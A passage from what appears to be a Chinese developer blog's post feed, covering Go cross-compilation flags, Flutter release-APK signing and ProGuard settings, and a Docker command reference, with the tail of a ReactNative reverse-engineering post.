src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E5%8A%A0%E5%AF%86.png" class=""><p>篡改后，明文</p><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E8%A7%A3%E5%AF%86.png" class="">]]></content>
    
    
    <categories>
      
      <category>ReactNative</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>ReactNative</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go交叉编译</title>
    <link href="/2021/08/22/go%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
    <url>/2021/08/22/go%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="查看支持架构"><a href="#查看支持架构" class="headerlink" title="查看支持架构"></a>查看支持架构</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">go tool dist list</span><br></code></pre></td></tr></table></figure><h2 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h2><p>Linux elf</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=amd64 go build hello.go<br></code></pre></td></tr></table></figure><p>arm架构</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GOARM</span>=7 <span class="hljs-attribute">GOARCH</span>=arm <span class="hljs-attribute">GOOS</span>=linux go build<br></code></pre></td></tr></table></figure><p>其中-w为去掉调试信息，-s为去掉符号表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs GOOS">GOOS=linux GOARCH=mips64  go build -ldflags &quot;-s -w&quot; main.go<br></code></pre></td></tr></table></figure><p>参数解析</p><p>GOOS：目标操作系统<br>GOARCH：目标操作系统的架构</p><table><thead><tr><th>OS</th><th>ARCH</th><th>OS version</th></tr></thead><tbody><tr><td>linux</td><td>386 / amd64 / arm</td><td>&gt;= Linux 2.6</td></tr><tr><td>darwin</td><td>386 / amd64</td><td>OS X (Snow Leopard + Lion)</td></tr><tr><td>freebsd</td><td>386 / amd64</td><td>&gt;= FreeBSD 7</td></tr><tr><td>windows</td><td>386 / amd64</td><td>&gt;= Windows 2000</td></tr></tbody></table><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><p> 在网络上的诸多教程中可能会看到下面的编译命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">CGO_ENABLED</span>=0 <span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=amd64 go build hello.go<br></code></pre></td></tr></table></figure><p>其中CGO_ENABLED=0的意思是使用C语言版本的GO编译器，</p><p>参数配置为0的时候就关闭C语言版本的编译器了。</p><p>自从golang1.5以后go就使用go语言编译器进行编译了。</p><p>在golang1.9当中没有使用CGO_ENABLED参数发现依然可以正常编译。当然使用了也可以正常编译。</p><p>比如把CGO_ENABLED参数设置成1，即在编译的过程当中使用CGO编译器，我发现依然是可以正常编译的。</p><p>实际上如果在go当中使用了C的库，</p><p>比如import “C”默认使用go build的时候就会启动CGO编译器，当然我们可以使用CGO_ENABLED=0来控制go build是否使用CGO编译器。</p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flutter编译release版本</title>
    <link href="/2021/08/22/flutter%E7%BC%96%E8%AF%91release%E7%89%88%E6%9C%AC/"/>
    <url>/2021/08/22/flutter%E7%BC%96%E8%AF%91release%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="1-生成jks"><a href="#1-生成jks" class="headerlink" title="1. 生成jks"></a>1. 生成jks</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">keytool -genkey -v -keystore ~/<span class="hljs-built_in">key</span>.jks -keyalg RSA -keysize <span class="hljs-number">2048</span> -validity <span class="hljs-number">10000</span> -<span class="hljs-built_in">alias</span> <span class="hljs-built_in">key</span><br></code></pre></td></tr></table></figure><h2 id="2-创建key-properities"><a href="#2-创建key-properities" class="headerlink" title="2. 创建key.properities"></a>2. 创建key.properities</h2><p>flutter-project/android下创建key.properities</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">storePassword</span> = <span class="hljs-number">123456</span><br><span class="hljs-attr">keyPassword</span> = <span class="hljs-number">123456</span><br><span class="hljs-attr">keyAlias</span> = key<br><span class="hljs-attr">storeFile</span> = xxx/xxx/key.jks<br></code></pre></td></tr></table></figure><h2 id="3-修改build-gradle"><a href="#3-修改build-gradle" class="headerlink" title="3.修改build.gradle"></a>3.修改build.gradle</h2><p>flutter-project/android/app/build.gradle</p><p>android {}上面粘贴</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">def</span> keystorePropertiesFile = rootProject.<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;key.properties&quot;</span>)<br><span class="hljs-keyword">def</span> keystoreProperties = <span class="hljs-keyword">new</span> Properties()<br>keystoreProperties.load(<span class="hljs-keyword">new</span> FileInputStream(keystorePropertiesFile))<br><br></code></pre></td></tr></table></figure><p>修改buildTypes</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">buildTypes</span> &#123;<br>    <span class="hljs-section">release</span> &#123;<br>        <span class="hljs-attribute">signingConfig</span> signingConfigs.release<br>        debuggable <span class="hljs-literal">false</span><br>        minifyEnabled <span class="hljs-literal">true</span><br>        shrinkResources <span class="hljs-literal">true</span><br>       // proguardFile getDefaultProguardFile(<span class="hljs-string">&#x27;proguard-android.txt&#x27;</span>), <span class="hljs-string">&#x27;proguard-rules.pro&#x27;</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>修改signingConfigs</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">signingConfigs &#123;<br>    release &#123;<br>        keyAlias keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;keyAlias&#x27;</span>]</span><br>        keyPassword keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;keyPassword&#x27;</span>]</span><br>        storeFile keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;storeFile&#x27;</span>]</span> ? file(keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;storeFile&#x27;</span>]</span>) : null<br>        storePassword keystoreProperties[<span class="hljs-string">&#x27;storePassword&#x27;</span>]<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-可选-设置编译架构"><a href="#4-可选-设置编译架构" class="headerlink" title="4. [可选] 设置编译架构"></a>4. [可选] 设置编译架构</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">buildTypes</span> &#123;<br>    <span class="hljs-section">release</span> &#123;<br>        <span class="hljs-attribute">signingConfig</span> signingConfigs.release<br>        ndk &#123;<br>            <span class="hljs-attribute">abiFilters</span> <span class="hljs-string">&#x27;armeabi-v7a&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-编译"><a href="#5-编译" class="headerlink" title="5. 编译"></a>5. 编译</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">flutter build apk</span> <br></code></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="找不到-pro文件"><a href="#找不到-pro文件" class="headerlink" title="找不到.pro文件"></a>找不到.pro文件</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Execution failed <span class="hljs-keyword">for</span> task <span class="hljs-string">&#x27;:app:minifyReleaseWithProguard&#x27;</span>.             <br>&gt; java.io.IOException: Please correct <span class="hljs-keyword">the</span> above warnings <span class="hljs-keyword">first</span>. <br></code></pre></td></tr></table></figure><p>将修改修改buildTypes里的注释打开，并在flutter-project/android/app/创建proguard-rules.pro</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 代码混淆压缩比，在0~7之间，默认为5，一般不做修改</span><br><br>-optimizationpasses <span class="hljs-number">5</span><br><br><span class="hljs-meta"># 去除编译时警告</span><br><br>-ignorewarnings<br><br><span class="hljs-meta">#不压缩输入的类文件</span><br><br>-dontshrink<br><br><span class="hljs-meta">#不优化输入的类文件</span><br><br>-dontoptimize<br><br><br><span class="hljs-meta"># 混合时不使用大小写混合，混合后的类名为小写</span><br><br>-dontusemixedcaseclassnames<br><br><span class="hljs-meta"># 指定不去忽略非公共库的类</span><br><br>-dontskipnonpubliclibraryclasses<br><br><span class="hljs-meta"># 这句话能够使我们的项目混淆后产生映射文件</span><br><br><span class="hljs-meta"># 包含有类名-&gt;混淆后类名的映射关系</span><br><br>-verbose<br><br><span class="hljs-meta"># 指定不去忽略非公共库的类成员</span><br><br>-dontskipnonpubliclibraryclassmembers<br><br><span class="hljs-meta"># 不做预校验，preverify是proguard的四个步骤之一，Android不需要preverify，去掉这一步能够加快混淆速度。</span><br><br>-dontpreverify<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>flutter</category>
      
    </categories>
    
    
    <tags>
      
      <tag>flutter</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker命令</title>
    <link href="/2021/08/22/docker%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/08/22/docker%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="1-源设置"><a href="#1-源设置" class="headerlink" title="1. 源设置"></a>1. 源设置</h2><p>/etc/docker/daemon.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><br><span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://alzgoonw.mirror.aliyuncs.com&quot;</span>]<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-镜像仓库"><a href="#2-镜像仓库" class="headerlink" title="2. 镜像仓库"></a>2. 镜像仓库</h2><ol><li><p>docker login [OPTIONS] [SERVER]</p><p>登录镜像仓库</p><p>-u:用户名</p><p>-p:密码</p><p>example：    </p></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">docler <span class="hljs-keyword">login</span> -u username -p <span class="hljs-keyword">password</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>docker logout</p><p>登出镜像仓库</p></li><li><p>docker search [OPTIONS] images</p><p>–automated :只列出automated build类型的镜像</p><p>–no-trunc：显示完整的镜像描述</p><p>-s：列出收藏数不小于指定值的镜像</p><p>example：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> search -s <span class="hljs-number">20</span> unbuntu  //列出收藏数不小于<span class="hljs-number">20</span>的ubuntu镜像<br></code></pre></td></tr></table></figure></li><li><p>docker pull [OPTIONS] name[:TAG@DIGEST]</p><p>-a：拉起所有tagged镜像</p><p>–disable-content-trust：忽略镜像校验，默认开启</p><p>example：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker pull unbuntu  <span class="hljs-regexp">//</span>拉去ubuntu最新版镜像<br></code></pre></td></tr></table></figure></li><li><p>docker push [OPTIONS] NAME[:TAG]</p><p>将本地镜像上传到镜像仓库，首先要登录到镜像仓库，还要登录到Docker Hub创建对应名称的仓库，然后用tag命令给镜像打标签，只有打完标签后才能上传。</p></li><li><p>docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/] [USERNAME/] NAME[:TAG]</p><p>标记本地镜像，归入某一仓库。</p><p>完整版push：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> tag ubuntu:latest eara<span class="hljs-number">0</span>/ubuntu:v<span class="hljs-number">1</span><br><span class="hljs-attribute">docker</span> Hub创建对应仓库<br><span class="hljs-attribute">docker</span> push area<span class="hljs-number">0</span>/ubuntu:v<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="3-生命周期"><a href="#3-生命周期" class="headerlink" title="3. 生命周期"></a>3. 生命周期</h2><ol><li><p>docker run</p><p>创建一个新的容器并运行</p><p>常用指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sell">-i选项表示使用交互模式，始终保持输入流开放<br>-t选项表示分配一个伪终端，一般两个参数结合时使用-it，即可在容器中利用打开的伪终端进行交互操作<br>-d选项: 后台运行容器，并返回容器ID--name选项可以指定docker run命令启动的容器名字，若无此选项，Docker将为容器随机分配一个名字<br>-c选项：用于给运行在容器中的所有进程分配CPU的shares值，这是一个相对权重，实际的处理速度还与宿主机的CPU相       关<br>-m选项：用于限制为容器中所有进程分配的内存总量，以B、K、M、G为单位-v选项：用于挂载一个volume，可以用多个<br>-v参数同时挂载多个volume。volume的格式为[host-dir]:[container-dir]:[rw|ro]<br>-p选项：用于将容器内部端口映射给宿主机的端口，其常见格式为：主机(宿主)端口:容器内部端口<br>-P选项：随机端口映射，容器内部端口随机映射到宿主机的端口<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it ubuntu /bin/bash    //启动并返回终端<br>docker run -itd --name ubuntu-test ubuntu /bin/bash  //后台启动并返回终端<br></code></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>docker start</p><p>启动一个或多个已经停止的容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker start b750bbbcfd88 <br></code></pre></td></tr></table></figure></li><li><p>docker stop</p><p>停止一个运行的容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop b750bbbcfd88<br></code></pre></td></tr></table></figure></li><li><p>docker restart</p><p>重启容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> restart b<span class="hljs-number">750</span>bbbcfd<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure></li><li><p>docker rm</p><p>删除容器</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">f <span class="hljs-symbol">:</span>通过SIGKILL信号强制删除一个运行中的容器</span><br><span class="ruby"></span>-<span class="ruby">l <span class="hljs-symbol">:</span>移除容器间的网络连接，而非容器本身</span><br><span class="ruby"></span>-<span class="ruby">v <span class="hljs-symbol">:-v</span> 删除与容器关联的卷</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rm -f b<span class="hljs-number">750</span>bbbcfd<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure></li><li><p>docker kill</p><p>杀掉运行中的容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> kill -s kill b<span class="hljs-number">750</span>bbbcfd<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure><p>PS.常见rm和kill组合命令</p><p>杀掉所有正在运行的容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker kill <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure><p>删除所有正在运行的容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker rm <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure></li><li><p>docker exec和docker attach</p><p>在运行中的容器执行命令</p><p>attach：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> attach <span class="hljs-number">1</span>e<span class="hljs-number">560</span>fca<span class="hljs-number">3906</span>   // 如果从这个容器退出，会导致容器的停止。<br></code></pre></td></tr></table></figure><p>exec:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-d :分离模式: 在后台运行</span><br><span class="hljs-deletion">-i :即使没有附加也保持STDIN 打开</span><br><span class="hljs-deletion">-t :分配一个伪终端</span><br></code></pre></td></tr></table></figure><p>example：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it <span class="hljs-number">243</span>c32535da7 <span class="hljs-regexp">/bin/</span>bash    <span class="hljs-regexp">//</span>返回shell<br></code></pre></td></tr></table></figure></li></ol><h2 id="4-导出和导入"><a href="#4-导出和导入" class="headerlink" title="4. 导出和导入"></a>4. 导出和导入</h2><ul><li>export和import</li></ul><ol><li><p>docker export</p><p>导出镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> export <span class="hljs-number">1</span>e<span class="hljs-number">560</span>fca<span class="hljs-number">3906</span> &gt; ubuntu.tar<br></code></pre></td></tr></table></figure></li><li><p>docker import</p><p>导入镜像</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat docker<span class="hljs-regexp">/ubuntu.tar | docker import - demo/u</span>buntu:v1<br>docker import http:<span class="hljs-regexp">//</span>demo.com     <span class="hljs-regexp">//</span>支持从url导入<br></code></pre></td></tr></table></figure></li><li><p>save和load</p><ol><li>docker save</li></ol><p>将指定镜像保存为tar文件</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">docker <span class="hljs-built_in">save</span> -o nginx.tar nginx:<span class="hljs-built_in">last</span><br></code></pre></td></tr></table></figure><ol start="2"><li>docker load</li></ol><p>导入使用docker save命令导出的镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker load -<span class="hljs-selector-tag">i</span> nginx<span class="hljs-selector-class">.tar</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="docker-save和docker-export的区别"><a href="#docker-save和docker-export的区别" class="headerlink" title="docker save和docker export的区别"></a>docker save和docker export的区别</h3><ol><li>docker save保存的是镜像（image），docker export保存的是容器（container）；</li><li>docker load用来载入镜像包，docker import用来载入容器包，但两者都会恢复为镜像；</li><li>docker load不能对载入的镜像重命名，而docker import可以为镜像指定新名称。</li></ol><h2 id="5-端口"><a href="#5-端口" class="headerlink" title="5.端口"></a>5.端口</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-<span class="hljs-selector-tag">p</span> <span class="hljs-number">1234</span>-<span class="hljs-number">1236</span>:<span class="hljs-number">1222</span>-<span class="hljs-number">1224</span>     <span class="hljs-comment">//指定范围添加端口</span><br>docker run -d -<span class="hljs-selector-tag">p</span> <span class="hljs-number">5001</span>:<span class="hljs-number">5000</span> training/webapp python app<span class="hljs-selector-class">.py</span> <span class="hljs-comment">//容器5000端口映射到主机5001</span><br>docker port bf08b7f2cd89<span class="hljs-comment">//查看映射端口</span><br></code></pre></td></tr></table></figure><h2 id="6-镜像管理"><a href="#6-镜像管理" class="headerlink" title="6. 镜像管理"></a>6. 镜像管理</h2><ol><li><p>docker images</p><p>通过docker images命令可以列出主机上的镜像，默认只列出最顶层的镜像，可以使用-a选项显示出所有镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker images -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure></li><li><p>docker rmi</p><p>docker rmi命令用于删除镜像，删除镜像时，如果已有基于该镜像启动的容器存在，则无法直接删除，需要先用rm命令删除容器。这两个子命令都提供 -f 选项，可强制删除存在容器的镜像或启动中的容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rmi kali:<span class="hljs-number">10</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>docker commit</p><p>docker commit命令可以将一个容器固化为一个新的镜像。当需要制定特定的镜像时，会进行修改容器的配置，比如在容器中安装一些特定的工具等，通过commit命令可以将这些修改保存起来，使其不会因为容器的停止而丢失。</p><ul><li>-a:提交的镜像作者</li><li>-c :使用Dockerfile指令来创建镜像</li><li>-m :提交时的说明文字</li><li>-p :在commit时，将容器暂停</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit -a <span class="hljs-string">&quot;demo&quot;</span> <span class="hljs-number">66</span>d<span class="hljs-number">682605023</span> kali:<span class="hljs-number">10</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="7-运维相关"><a href="#7-运维相关" class="headerlink" title="7. 运维相关"></a>7. 运维相关</h2><ol><li><p>docker ps</p><p>常用的选项有-a和-l，-a选项可以查看所有的容器，包括停止的容器；-l选项只查看最新创建的容器，包括不在运行的容器</p></li><li><p>docker rename</p><p>重命名容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rename <span class="hljs-number">12312391</span> newname<br></code></pre></td></tr></table></figure></li><li><p>docer stats</p><p>显示容器资源的使用情况统计信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> stats <span class="hljs-number">12312391</span><br></code></pre></td></tr></table></figure></li><li><p>docker top</p><p>查看运行的进程信息</p></li><li><p>docker cp</p><p>主机与容器之间数据拷贝</p><p>example：</p><ul><li><p>将本目录下的test.php文件复制到容器的’/var/www/html/‘目录下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker cp test.php <span class="hljs-number">5198</span>ec963e43:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br></code></pre></td></tr></table></figure></li><li><p>将容器内’/var/www/html/index.php’复制到本机/root目录下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker cp <span class="hljs-number">5198</span>ec963e43:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php <span class="hljs-regexp">/root/</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>docker diff</p><p>查看容器文件结构</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> diff <span class="hljs-number">5198</span>ec<span class="hljs-number">963</span>e<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure></li><li><p>docker events</p><p>从服务器获取实时时间</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-f:根据条件过滤事件</span><br><span class="hljs-deletion">--since:从指定的时间戳后显示所有事件</span><br><span class="hljs-deletion">--until:流水时间显示到指定的时间为止</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> events --since=<span class="hljs-string">&quot;&quot;</span><span class="hljs-number">2020</span>-<span class="hljs-number">01</span>-<span class="hljs-number">21</span><span class="hljs-string">&quot; </span><br></code></pre></td></tr></table></figure></li><li><p>docker history</p><p>查看指定镜像的创建历史</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">history</span> TAG<br></code></pre></td></tr></table></figure></li><li><p>docker inspect</p><p>来查看 Docker 的底层信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker inspect 243c32535da7<br></code></pre></td></tr></table></figure></li><li><p>docker logs</p><p>查看容器打印日志</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> logs -f bf<span class="hljs-number">08</span>b<span class="hljs-number">7</span>f<span class="hljs-number">2</span>cd<span class="hljs-number">89</span>  //查看日志<br></code></pre></td></tr></table></figure></li></ol><h2 id="8-文件映射"><a href="#8-文件映射" class="headerlink" title="8. 文件映射"></a>8. 文件映射</h2><ol><li>主机卷的映射</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">docker run -it -v <span class="hljs-regexp">/root/</span>software:<span class="hljs-regexp">/software --privileged=true  docker.io/</span>centos <span class="hljs-regexp">/bin/</span>bash<br><br>-v 挂载目录<span class="hljs-regexp">/root/</span>software 本地目录 /software容器目录，在创建前容器是没有software目录的容器会自己创建<br>--privileged=<span class="hljs-keyword">true</span> 关闭安全权限，否则你容器操作文件夹没有权限<br></code></pre></td></tr></table></figure><ol start="2"><li><p>通过docker创建卷</p><p>此种方式不必考虑权限问题，docker会为我们处理好权限。 </p><ul><li>创建 docker volume create –name v1</li><li>查看 docker inspect v1</li><li>删除数据卷 docker volume rm v1</li></ul><p>创建容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -v v1:/usr/local/nginx --name nginx  